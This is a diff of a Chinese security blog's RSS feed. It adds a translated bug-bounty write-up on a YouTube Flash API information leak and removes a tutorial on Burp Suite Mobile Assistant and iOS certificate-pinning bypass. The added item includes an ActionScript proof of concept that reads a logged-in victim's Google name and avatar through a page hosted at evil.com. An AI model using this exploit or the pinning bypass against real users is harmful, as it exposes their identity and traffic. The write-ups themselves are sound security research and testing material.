@@ -5,7 +5,66 @@
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/</link>
 <description>twosecurity.io</description>
 <language>zh-cn</language>
-<lastBuildDate>Fri, 08 Sep 2017 00:18:17 +0800</lastBuildDate>
+<lastBuildDate>Sat, 09 Sep 2017 21:54:44 +0800</lastBuildDate>
+<item>
+<title>看我如何将 Flash 漏洞死灰复燃（1）</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-09-29195210.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;看我如何将 Flash 漏洞死灰复燃（1）&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29195210&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f6524a1333536281bfb19e59ece4f27a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Flash 不是一个 Dead App 了吗？&lt;/h2&gt;&lt;p&gt;尽管 Flash 安全的山河日渐衰败，但它依然不可小觑。哪怕是在今年，我也汇报了许多 flash 相关的漏洞给 Facebook，Youtube，WordPress，Yahoo 等公司。在近三年中，我在漏洞奖励项目中至少交了50个 Flash 漏洞。这些漏洞给我带来高达8万刀的奖励。然而这只是冰山一角，Flash 的漏洞远不仅如此。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fe7713ffe1d1548a0a6e1310d07f8d36_r.jpg&quot; data-rawwidth=&quot;300&quot; data-rawheight=&quot;184&quot;&gt;&lt;p&gt;虽然 Flash 在离我们远去，新引进的 javascript/HTML5 却带来新的一波问题。比方说 CORS滥用，由 XHR 或者 postMessage 引发的 DOM XSS。了解 Flash 曾犯下的安全问题有助于我们修补新时代的漏洞。Youtube 最新的 html5 API 就是由 Flash Api 移植的，这无疑值得我们探索。&lt;/p&gt;&lt;p&gt;在余下的篇幅中，我会介绍一些我在 Youtube Flash Api 中找到的精品Flash漏洞。由此引入 html/javascript 的一些安全技巧。&lt;/p&gt;&lt;h2&gt;对 Youtube Flash API 的逆向&lt;/h2&gt;&lt;p&gt;Youtube 的 Flash Api 使用户可以外链它的视频。下图大致描述了其工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f6524a1333536281bfb19e59ece4f27a_r.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;286&quot;&gt;&lt;p&gt;Youtube 的 Wrapper 位于 `youtube.com/v/[VIDEO_ID]` 的一个 Flash 文件。而主程序在 `domain s.ytimg.com`。剩下的模块则负责处理广告、副标题等内容。除了 Flash 到 javascript API，我们还可以发送 `play()`，`pause()` 等命令。Flash 文件会通过类似 ajax 的方式跨域请求视频数据及配置。&lt;/p&gt;&lt;h2&gt;漏洞1：用户信息泄漏&lt;/h2&gt;&lt;p&gt;我们先从一个简单的漏洞入手，这是一段精简过的 Flash ActionScript3 代码：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;public class YoutubeWrapper extends Sprite{
+private var user_name =
+&quot;The Victim&quot;;
+private var user_picture =
+&quot;https://googleusercontent.com/.../victim_photo.jpg&quot;;
+private var appLoader =
+new Loader();
+
+public function
+YoutubeWrapper(){
+// 允许外部js/Flash获取其公开属性
+Security.allowDomain(&quot;*&quot;);
+// 加载主程序
+this.appLoader
+.load(new URLRequest(&quot;https://s.ytimg.com/.../watch_as3.swf&quot;);
+// 将其加入为display container的child
+this.addChild(this.appLoader );
+//
+loaderInfo.sharedEvents Api
+this.loader.contentLoaderInfo.sharedEvents
+.addEventListener(&quot;REQUEST_USERINFO&quot;, this.onRequestUserinfo);
+}
+private function
+onRequestUserinfo(event:Event){
+// 将用户信息写入event.data
+// 我们可以通过 sharedEvents caller 获取它
+event.data.user_name =
+this.user_name;
+event.data.user_image
+= this.user_image;
+}
+}&lt;/code&gt;&lt;p&gt;Youtube Wrapper（包装页面）的属性 “user_name” 包含了谷歌帐号名（在登录了谷歌的情况下）。“user_picture” 则包含了到用户头像的链接。我们是否可以通过某种方法获取这些属性呢？&lt;/p&gt;&lt;p&gt;Youtube Wrapper 能够被开发者的 Flash 文件加载。然而它们都被沙箱政策限制着。&lt;/p&gt;&lt;p&gt;&amp;gt; 在 Flash 中引入外部 Flash 和加载 iframe 类似。如果 iframe 不是同源的，那么它就不能获得父页面的属性。&lt;/p&gt;&lt;p&gt;Youtube Wrapper 包含了 `Security.allowDomain(“*”)`，javascript 便可以向它发送 `play()`、`pause()` 等命令。这意味着在同一个沙箱中，攻击者的Wrapper可以获取任意 Youtube Wrapper 的公开属性。不幸的是，我们并不能获得私有属性。&lt;/p&gt;&lt;p&gt;让我们把目光移向 loaderInfo.sharedEvents，这个 API 允许 Loader 和被加载的文件互相通信。Youtube Wrapper 就用这个 API 和主程序通信。当主程序发送一个事件给 sharedEvent API 时，Youtube Wrapper 会接收该事件并返回 event.data 的信息。&lt;/p&gt;&lt;p&gt;除了 loader 和被加载的文件之外，任何有 loaderInfo 对象 reference（引用）的 Flash 文件都可以调用 loaderInfo.sharedEvents。&lt;/p&gt;&lt;p&gt;&amp;gt; 这个方法类似 postMessage。它们都提供了跨域通信的方式。不仅如此，只要对一个 iframe或者其父页面有 reference，其它窗口也可以调用 postMessage。只要用 window.open 或者window.frames，任意域名都可以访问到 reference。&lt;/p&gt;&lt;p&gt;如果我们可以访问到 loaderInfo 对象，我们就可以窃取用户信息了。可惜的是，loaderInfo 是Youtube Wrapper 的一个私有属性。&lt;/p&gt;&lt;p&gt;不过，当用 Loader 时，我们需要将其添加为 Display Contianer 的 child 以播放被加载的文件。通常来讲，我们会用 `this.addChild(this.loader);` 实现（Youtube Wrapper 也是这么做的）。Youtube Wrapper 还有一个公开的 `getChildAt()` 方法，这个函数会返回 loader 对象。我们可以通过它绕过前面的私有属性限制。&lt;/p&gt;&lt;p&gt;我们可以进一步使用 `YoutubeWrapper.getChildAt(0).loaderInfo.sharedEvents` 发送事件给Youtube。Youtube Wrapper 便会返回 event.data，泄漏隐私大功告成！&lt;/p&gt;&lt;p&gt;PoC：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;var loader = new Loader();
+// 加载Youtube Wrapper
+loader.load(new
+URLRequest(&quot;https://www.youtube.com/v/[VIDEO_ID]&quot;));
+var youtubeWrapper = loader.content;
+// 访问Youtube AppLoader对象
+var appLoader = youtubeWrapper.getChildAt(0);
+// 访问appLoader的loaderInfo.sharedEvents
+var LeakingSharedEvents = appLoader.contentLoaderInfo.sharedEvents;
+// 准备要发给Youtube Wrapper的事件
+var leakEvent = new Event(&quot;Request_username&quot;);
+leakEvent.data = new Object();
+// 发送leakEvent到LeakingSharedEvents
+LeakingSharedEvents.dispatchEvent(leakEvent);
+
+// 现在可以获得用户名和图像了
+trace(leakEvent.data.user_name);
+trace(leakEvent.data.user_picture);&lt;/code&gt;&lt;p&gt;大致工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a10403d51f4083427c26a8e2266857fc_r.png&quot; data-rawwidth=&quot;1358&quot; data-rawheight=&quot;486&quot;&gt;&lt;h2&gt;攻击方案&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;前提条件： 用户安装了 flash 并登录到 Google&lt;/li&gt;&lt;li&gt;1：目标访问攻击者控制的 evil.com/evil.html ，该页面包含了一个恶意 Flash 文件&lt;br&gt;evil.swf&lt;/li&gt;&lt;li&gt;2：evil.swf 加载 Youtube wrapper 并获取目标的用户名。除此之外，还可能通过用户头像的链接来判断出谷歌帐号&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;作者：&lt;b&gt;Enguerran Gillier&lt;/b&gt; ---&lt;a href=&quot;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/&quot;&gt;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube/&lt;/a&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-09-09-29195210</guid>
+<pubDate>Sat, 09 Sep 2017 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>Chrome Trubofan 优化不当而导致的 RCE</title>
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-06-29097125.htm</link>
@@ -575,17 +634,6 @@ User.select(params[:column])&lt;/code&gt;&lt;p&gt;&lt;br&gt;SQL：&lt;br&gt;&lt;
 <author>TwoSecurity</author>
 <guid isPermaLink="false">2017-05-26-27131797</guid>
 <pubDate>Fri, 26 May 2017 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>Burp Suite Mobile Assistant</title>
-<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-05-17-26920791.htm</link>
-<description>&lt;meta charset=&quot;utf-8&quot;&gt;
-&lt;title&gt;Burp Suite Mobile Assistant&lt;/title&gt;
-&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/26920791&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;    Burp Suite 在前段时间更新了v1.7.22版本，其中引入了一个新的模块： Mobile Assistant，它用于配合 Burp Suite 更方便地测试 iOS 应用程序。它可以修改 iOS 设备的系统代理设置，让  HTTP(S) 流量可以轻松重定位到电脑上正在运行的 Burp 。另外它还可以绕过你需要注入 App  的 SSL 证书的验证，拦截、检查和修改所有流量。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;安装 Burp Suite Mobile Assistant&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;    因为其功能的性质，需要依赖越狱设备上的软件包管理器 Cydia，并且要注意的是，Mobile Assistant 有些功能目前不支持 iOS10，所以在想使用 Mobile Assistant 相应的功能的时候，注意自己设备的固件版本。&lt;/p&gt;&lt;p&gt;安装 Mobile Assiatant 有两种方法，首先是使用 Cydia 安装：&lt;/p&gt;&lt;br&gt;&lt;ol&gt;&lt;li&gt;在PC端打开 Burp Suite，设置好代理监听的接口以及端口，我这里设置的端口为8080，接口为我主机的 IP。&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-820e68fdb6e47b51af29865e05a76bdf_r.jpg&quot; data-rawwidth=&quot;1366&quot; data-rawheight=&quot;656&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;在越狱设备上打开 Cydia，打开软件源选项，再编辑、添加。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-51be938e45618b21df182a05d0d2da21_r.png&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;/li&gt;&lt;li&gt;要使用 HTTP 协议，输入我们 Burp Suite 所在 PC 端的 IP 地址或主机名以及 Burp Suite 监听的端口号。如果 Cydia 无法连接，注意你的监听代理的设置是否正确以及检查计算机防火墙是否关闭。&lt;br&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-af9e31a22ffe4b0857f302095fce6010_r.png&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;添加成功后，Burp Suite 现在应该显示为单个源。&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-dceca89431e9872ef65045020f253a08_r.png&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;/li&gt;&lt;li&gt;点开单个源:&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1dd59d04db7c6431fc6bc2ee69896493_r.png&quot; data-rawwidth=&quot;431&quot; data-rawheight=&quot;379&quot;&gt;&lt;/li&gt;&lt;li&gt;点击mobileassistant应用程序进行安装:&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-637bc005cc5ad125011676cba8b8e99d_r.png&quot; data-rawwidth=&quot;424&quot; data-rawheight=&quot;216&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;点击安装:&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-74a66ddc42726fe9114995d6ccdb66b9_r.png&quot; data-rawwidth=&quot;428&quot; data-rawheight=&quot;424&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;之后就会进行下载并安装它。在完成之后，您需要重新启动弹出菜单按钮来应用更改。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fb93900bdd5bc6b8a083965c5d40f68f_r.png&quot; data-rawwidth=&quot;293&quot; data-rawheight=&quot;505&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;在安装成功后便会在桌面出现我们的 Mobile Assistant 应用了。&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6315f2536d0964e71e740270345df5f3_r.png&quot; data-rawwidth=&quot;470&quot; data-rawheight=&quot;274&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;还可以让设备通过浏览器访问 Burp Suite 的浏览器界面，即&lt;a href=&quot;http://192.168.169.22:8080&quot; data-title=&quot;http://192.168.169.22:8080&quot; class=&quot;&quot;&gt;http://192.168.169.22:8080&lt;/a&gt;（主机局域网IP:监听端口）/mobileassistant.deb 来实现安装，下载完成之后通过 Cydia 来完成安装，但是要注意将我们的 deb 格式的安装包导入 /var/root/Media/Cydia/AutoInstall，然后重启 iOS 设备，进入 Cydia 的软件包，就可以发现已经安装好了。 &lt;img src=&quot;https://pic3.zhimg.com/v2-e5a25ca639c07765c18b0bcd18a0bf5c_r.png&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;无论是哪种安装方法，都必须要保证我们的主机以及 iOS 设备连接的是同一个网络。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;使路由流量通过 Burp&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;      首先你要保证你的 Burp 实例正在运行，并且可以从移动设备上进行网络访问，然后在移动设备端的 Burp Suite Mobile Assistant 中设置要进行连接的 Burp Suite 实例的主机 IP 和端口，然后来安装 CA 证书，将 Burp Suite 作为移动设备的代理。在配置完成后，可以通过以下方法来验证你的配置：&lt;/p&gt;&lt;p&gt;1. 网络连接：设备是否能够连接到给定的主机和端口。&lt;/p&gt;&lt;p&gt;2. Burp 验证：给定的主机 IP 和端口上监听服务是否是 Burp Suite 的实例。&lt;/p&gt;&lt;p&gt;3. CA 证书安装：设备是否信任所配置的 Burp Suite 实例的 CA 证书。&lt;/p&gt;&lt;p&gt;4. 启用代理：设备是否通过所提供的主机和端口为 HTTP 和 HTTPS 连接配置的代理服务器。&lt;/p&gt;&lt;p&gt;注意： 移动助手对代理设置所做的更改是短暂的，会在重新启动后恢复原来的设置。在运行  iOS 9.0 版以上的设备时，使用 Mobile Assistant 对代理设置所做的更改不会反映在 iOS 设置应用中。Burp CA 证书的安装在重新启动后不会恢复。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;绕过证书锁定&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;证书锁定是应用程序用来防御恶意用户扮演可信任服务器的技术，在这种情况下，锁定（pinning）是一种术语，指的是针对本地合法证书进行身份验证（由远程服务器提供 SSL 证书）的过程。所以说，只有当服务器可以提供与应用相匹配的证书可以证明其身份时，才能和远程服务器建立连接。&lt;/p&gt;&lt;p&gt;默认情况下，Burp Suite 通过其自签名的 CA 证书为每台主机生成签名证书。即使设备可能会信任这些证书，但它们无法与应用程序预期的证书相匹配。那么即使该设备已正确配置为  HTTPS 代理，也会造成 Burp Suite 的拦截和查看应用程序流量的能力会被证书锁定削弱。&lt;/p&gt;&lt;p&gt;Burp Suite Mobile Assistant 还可以注入其他应用程序，并且还能挂载到低级系统 API 以破坏证书锁定，从而允许用户拦截流量，甚至在证书锁定执行中的时候也可以。&lt;/p&gt;&lt;p&gt;使用系统 API 、第三方库或自定义代码，可通过不同方式实现证书锁定。然而某些情况下注入应用程序成功也可能无法禁用锁定，这表明应用程序正使用自定义代码执行证书锁定。&lt;/p&gt;&lt;p&gt;注：Mobile Assistant 绕过证书锁定的特性目前暂不支持 iOS 10 版本。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;注入到应用程序&lt;br&gt;&lt;/b&gt;将你想要进行测试的 app 添加到列表中，这时候如果该应用程序与列表中的应用程序中至少有一个表项匹配，那么该 app 将会通过绕过证书锁定的方式被注入，接下来我们来介绍一下。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;首先启动 Burp Suite Mobile Assistant，跟启动其他应用程序一样，点击图标：&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6315f2536d0964e71e740270345df5f3_r.png&quot; data-rawwidth=&quot;470&quot; data-rawheight=&quot;274&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;设置代理：&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5c77af9aa4f9328989ee7280a7957a60_r.png&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;点击添加要注入的应用程序：&lt;br&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c48620615e09744f0c01cd25360d8783_r.png&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;添加成功会出现在列表中：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d2d00a402b44ad2664dba4aab22e7e66_r.png&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;之后就可以开启或关闭注入功能了。在开启后，Mobile Assistant 会执行各种检查，如果这个过程发现错误，将会被自动关闭这个功能。同时在开启注入功能之后，我们需要去启动被注入的应用程序（若之前启动了，需要重新启动才能生效）：&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6979e9d51889904c393ef9f883ed735a_r.png&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;如果弹出下图所示窗口，表示注入成功：&lt;br&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3cd42a2f7bea44b3739117a07801c2a6_r.png&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;300&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;点击OK，MobileAssistant将绕过证书锁定，并且应用程序将能使用Burpsuite的自签名证书以数据的形式传输到服务器和客户端之间。&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-fa170e12b6301c587afb35d2c50efb6a_r.png&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;343&quot;&gt;&lt;br&gt; 你可能还想注入到多个相关应用中，可以通过这几种方式来过滤流量：&lt;br&gt;&lt;ol&gt;&lt;li&gt;可执行文件：将会匹配每个可执行文件名称与过滤器值相匹配的应用程序。&lt;br&gt;&lt;/li&gt;&lt;li&gt;软件包 ID：将会匹配有指定软件包 ID 的应用程序，或者有与该软件包 ID 有依赖关系的框架。比如，过滤器 com.apple.UIKit 将所有应用程序与 GUI 匹配; 过滤器  com.apple.Security 将与所有应用程序进行匹配。&lt;br&gt;&lt;/li&gt;&lt;li&gt;类：将会匹配所有实现名称与过滤器值相匹配的类的应用程序。&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;从崩溃中恢复&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;注入应用程序和挂载 API 调用的过程中是存在潜在风险。为此，Cydia Substrate 插件在意外情况下可防止设备进入永久崩溃状态。出现 Burp Suite 移动助手崩溃并引发问题的情况时，请参阅 Cydia Substrate 的安全模式来解决。&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;参考&lt;/b&gt;&lt;b&gt;：&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;a href=&quot;https://support.portswigger.net/customer/en/portal/articles/2798917-Using%20Burp_MobileAssistant_Using.html&quot; data-editable=&quot;true&quot; data-title=&quot;Configuring Burp Suite Mobile Assistant&quot; class=&quot;&quot;&gt;Configuring Burp Suite Mobile Assistant&lt;/a&gt;&lt;a href=&quot;https://support.portswigger.net/customer/en/portal/articles/2798917-Using%20Burp_MobileAssistant_Using.html&quot; data-editable=&quot;true&quot; data-title=&quot;Configuring Burp Suite Mobile Assistant&quot; class=&quot;&quot;&gt;&lt;br&gt;&lt;/a&gt;&lt;a href=&quot;https://portswigger.net/burp/help/mobile_testing_using_mobile_assistant.html&quot; data-editable=&quot;true&quot; data-title=&quot;Using Burp Suite Mobile Assistant&quot; class=&quot;&quot;&gt;Using Burp Suite Mobile Assistant&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://support.portswigger.net/customer/en/portal/articles/2798916-installing-burp-suite-mobile-assistant&quot; data-editable=&quot;true&quot; data-title=&quot;Installing Burp Suite Mobile Assistant&quot; class=&quot;&quot;&gt;Installing Burp Suite Mobile Assistant&lt;/a&gt;</description>
-<author>TwoSecurity</author>
-<guid isPermaLink="false">2017-05-17-26920791</guid>
-<pubDate>Wed, 17 May 2017 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
